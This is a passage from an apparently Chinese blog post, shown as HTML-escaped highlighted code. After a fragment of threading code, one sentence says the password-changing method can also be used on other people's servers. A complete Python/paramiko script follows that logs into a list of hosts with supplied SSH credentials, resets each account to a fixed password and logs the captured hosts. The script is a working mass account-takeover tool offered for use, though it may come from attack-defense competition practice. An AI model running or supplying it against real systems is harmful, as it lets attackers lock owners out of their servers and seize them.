        t&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;threading&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Thread&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;target&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;args&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        th&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;th_num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        th&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;th_num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        th&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        

&lt;span class=&#34;token comment&#34;&gt;#q.join () 所有任务完成&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;我们改密码是为了防止被别人弱口令爆破，或者密码是默认的情况导致服务器丢失，这里我们也可以尝试去更改别人的密码&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; paramiko
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys

ssh_clients &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
timeout &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
new_password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;xcxy@ncwss123&#34;&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;SSH_Client&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;is_root &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; host
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; port
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; username
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; password
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SSHClient&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_missing_host_key_policy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;paramiko&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AutoAddPolicy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;connect&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;timeout&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;exec_command&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ssh&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;command&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;change_password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exec_command&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;passwd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;root&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            stdin&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; new_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        stdin&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; new_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;success&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; stderr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; new_password
            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;save_log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;a+&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s %s %s %s\n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Usage:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\t python %s [FILENAME]&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    filename &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Loading file : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;filename&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            line &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; line&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            host &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
            port &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
            password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Trying login : %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; host&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                ssh_client &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; SSH_Client&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; port&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; Exception &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [-] %s&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;token keyword&#34;&gt;continue&lt;/span&gt;
            ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_client&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Login finished. &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+&amp;#125; Got [%d] clients. &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] Starting changing password. &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ssh_client &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; ssh_clients&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;change_password&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] %s (Success!)&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
            ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;save_log&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;success.log&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; [+] %s (Failed!)&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; ssh_client&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;host&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
